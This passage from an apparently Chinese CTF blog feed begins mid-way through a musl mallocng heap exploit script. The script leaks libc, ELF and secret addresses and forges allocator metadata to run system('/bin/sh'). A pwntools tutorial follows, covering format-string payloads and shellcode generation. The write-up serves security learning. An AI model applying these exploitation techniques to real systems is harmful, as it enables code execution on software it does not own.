class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">new_key = (<span class="built_in">int</span>((random.random()) * <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>)) % <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> calc(key) == calc(new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)) :</span><br><span class="line"><span class="keyword">return</span> new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        query(<span class="string">b&quot;h&quot;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>():</span><br><span class="line">    info = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        info = p.recv(<span class="number">2</span>) + info</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(info, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- leak info --</span></span><br><span class="line">fengshui1(<span class="number">1</span>)</span><br><span class="line">fengshui2(<span class="number">5</span>) <span class="comment"># AFFFFFU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak elf &amp; libc</span></span><br><span class="line">store(<span class="string">b&quot;hhhh&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x30</span>) <span class="comment"># [U]AAAA(U)U  [U] is KV, (U) is KV-&gt;value</span></span><br><span class="line">store(find_key(), <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>) <span class="comment"># [F]AAAUFU</span></span><br><span class="line"></span><br><span class="line">fengshui2(<span class="number">3</span>) <span class="comment"># FFFFUFU</span></span><br><span class="line">store(<span class="string">b&quot;H\n&quot;</span>, <span class="string">b&quot;H&quot;</span>, <span class="number">0x1000</span>) <span class="comment"># AAAAU[U]U  [U] is the chunk we can get</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">addr_mmap = get_leak() - <span class="number">0x20</span></span><br><span class="line">addr_libc = addr_mmap + <span class="number">0x4000</span></span><br><span class="line">addr_malloc_context = addr_libc + <span class="number">0xad9c0</span></span><br><span class="line">addr_elf = get_leak() - <span class="number">0xc8d0</span></span><br><span class="line">addr_hhhh = addr_elf + <span class="number">0xc890</span></span><br><span class="line">addr_KV = addr_elf + <span class="number">0xcde0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak secret</span></span><br><span class="line">delete(<span class="string">b&quot;H&quot;</span>) <span class="comment"># AAAAUFU</span></span><br><span class="line">fengshui2(<span class="number">2</span>) <span class="comment"># AAFFUFU</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(<span class="number">4</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>) <span class="comment"># UUFFUFU</span></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">secret = get_leak()</span><br><span class="line">get_leak()</span><br><span class="line">addr_heap = get_leak() - <span class="number">0x180</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;addr_elf: &quot;</span> + <span class="built_in">hex</span>(addr_elf))</span><br><span class="line">success(<span class="string">&quot;addr_mmap: &quot;</span> + <span class="built_in">hex</span>(addr_mmap))</span><br><span class="line">success(<span class="string">&quot;addr_libc: &quot;</span> + <span class="built_in">hex</span>(addr_libc))</span><br><span class="line">success(<span class="string">&quot;secret: &quot;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- construct --</span></span><br><span class="line"></span><br><span class="line">delete(KV) <span class="comment"># FFAAUFU</span></span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xafd48</span></span><br><span class="line">addr_fake_meta_area = addr_mmap + <span class="number">0x1000</span></span><br><span class="line">addr_fake_meta = addr_fake_meta_area + <span class="number">0x18</span></span><br><span class="line">addr_fake_group = addr_fake_meta + <span class="number">0x28</span></span><br><span class="line">addr_fake_chunk = addr_fake_group + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(last_idx | freeable &lt;&lt; <span class="number">5</span> | sc &lt;&lt; <span class="number">6</span> | maplen &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta_area = <span class="string">b&quot;h&quot;</span> * <span class="number">0xfd0</span></span><br><span class="line">fake_meta_area += p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = fake_meta_area</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">store(payload, <span class="string">b&quot;victim&quot;</span>, <span class="number">0x1200</span>) <span class="comment"># FFAUUFU</span></span><br><span class="line">store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line">fengshui2(<span class="number">1</span>) <span class="comment"># AAUUUFU</span></span><br><span class="line">addr_hhhh = addr_hhhh + <span class="number">0xb0</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(<span class="number">4</span>) + p64(<span class="number">0x80</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">musl libc 堆管理器 mallocng 详解 (Part I)</a></p><p><a href="https://www.anquanke.com/post/id/253566">从musl libc 1.1.24到1.2.2 学习pwn姿势</a></p><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！</a></p><p><a href="https://bbs.pediy.com/thread-269533-1.htm">[原创]musl 1.2.2 总结+源码分析 One</a></p><p><a href="http://pzhxbz.cn/?p=172">新版musl libc 浅析</a></p><p><a href="http://blog.leanote.com/post/xp0int/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int">2022-强网杯初赛-Writeup-By-Xp0int</a></p><p><a href="https://www.anquanke.com/post/id/241104">借助DefCon Quals 2021的mooosl学习musl mallocng</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;浅浅分析一下&lt;/p&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://humoooor.cn/categories/Computer-Science/"/>
    
    
    <category term="Musl libc" scheme="https://humoooor.cn/tags/Musl-libc/"/>
    
    <category term="Memory Management" scheme="https://humoooor.cn/tags/Memory-Management/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools 的安装及使用</title>
    <link href="https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-05T11:03:00.000Z</published>
    <updated>2023-10-04T11:45:39.608Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下安装 pwntools 的过程和基本使用</p><span id="more"></span><h2 id="Pwntools-安装"><a href="#Pwntools-安装" class="headerlink" title="Pwntools 安装"></a>Pwntools 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>如果出现下面的 warning</p><blockquote><pre><code>WARNING: The scripts asm, checksec, common, constgrep, cyclic, debug, disablenx, disasm, elfdiff, elfpatch, errno, hex, main, phd, pwn, pwnstrip, scramble, shellcraft, template, unhex, update and version are installed in &#39;/home/yahu/.local/bin&#39; which is not on PATH.Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.</code></pre></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 .bashrc 文件添加</span></span><br><span class="line"><span class="built_in">export</span> PATH=~/.local/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 然后 source 相应的文件即可</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>这样就可以直接使用 pwntools 自带的工具，如 checksec、cyclic 等</p><h2 id="Pwntools-使用"><a href="#Pwntools-使用" class="headerlink" title="Pwntools 使用"></a>Pwntools 使用</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>用于查看文件的保护机制、架构信息等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h4 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h4><p>用于随机生成一串有序字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><h3 id="常用-python-模块"><a href="#常用-python-模块" class="headerlink" title="常用 python 模块"></a>常用 python 模块</h3><h4 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 系统、架构、日志输出等级</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386/amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="引入程序"><a href="#引入程序" class="headerlink" title="引入程序"></a>引入程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># 远程</span></span><br><span class="line">r = remote(<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"><span class="comment"># 最终进行交互</span></span><br><span class="line">r.interactive()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入程序文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ELF</span>(<span class="params">path : <span class="built_in">str</span></span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">    = p.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取函数地址</span></span><br><span class="line">addr_func = elf.sym[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取函数 plt 地址</span></span><br><span class="line">plt_func = elf.plt[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取函数 got 地址</span></span><br><span class="line">got_func = elf.got[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="number">134514548</span></span><br></pre></td></tr></table></figure><h4 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data : <span class="built_in">bytes</span></span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendafter</span>(<span class="params">delim : <span class="built_in">bytes</span>, data : <span class="built_in">bytes</span></span>)</span><br><span class="line">p.sendline(<span class="built_in">bytes</span>)</span><br><span class="line">p.sendlineafter(<span class="built_in">bytes</span>, <span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="接受数据"><a href="#接受数据" class="headerlink" title="接受数据"></a>接受数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="built_in">int</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="built_in">bytes</span>)</span><br><span class="line">p.recvafter(<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将数据打包成 n 位的二进制包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p8</span>(<span class="params">number : <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span></span><br><span class="line">p16(<span class="built_in">bytes</span>)</span><br><span class="line">p32(<span class="built_in">bytes</span>)</span><br><span class="line">p64(<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">114514</span>)</span><br><span class="line"><span class="string">b&#x27;R\xbf\x01\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 n 位的二进制包解包成数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u8</span>(<span class="params">number : <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line">u16(<span class="built_in">int</span>)</span><br><span class="line">u32(<span class="built_in">int</span>)</span><br><span class="line">u64(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">b&#x27;R\xbf\x01\x00&#x27;</span>)</span><br><span class="line"><span class="number">114514</span></span><br></pre></td></tr></table></figure><h4 id="其他常用"><a href="#其他常用" class="headerlink" title="其他常用"></a>其他常用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式化字符串漏洞利用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span>(<span class="params">offset : <span class="built_in">int</span> , writes : <span class="built_in">map</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移为1，将地址为2的值修改成3，将地址为6的值修改成7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmtstr_payload(<span class="number">1</span>, &#123;<span class="number">2</span> : <span class="number">3</span>, <span class="number">6</span> : <span class="number">7</span>&#125;)</span><br><span class="line"><span class="string">b&#x27;%3c%6$lln%4c%7$hhnaa\x02\x00\x00\x00\x06\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 shellcode 字符串，会随架构设置而生成对应的 shellcode</span></span><br><span class="line">shellcraft.sh()</span><br><span class="line">shellcraft.i386.sh()</span><br><span class="line">shellcraft.amd64.sh()</span><br><span class="line">shellcraft.arm.sh()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串形式的汇编转成机器码</span></span><br><span class="line">asm()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;8.8.8.8&#x27;, 8888)</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一下安装 pwntools 的过程和基本使用&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://humoooor.cn/categories/Pwn/"/>
    
    
    <category term="Tools" scheme="https://humoooor.cn/tags/Tools/"/>
    
  </entry>
  
</feed>
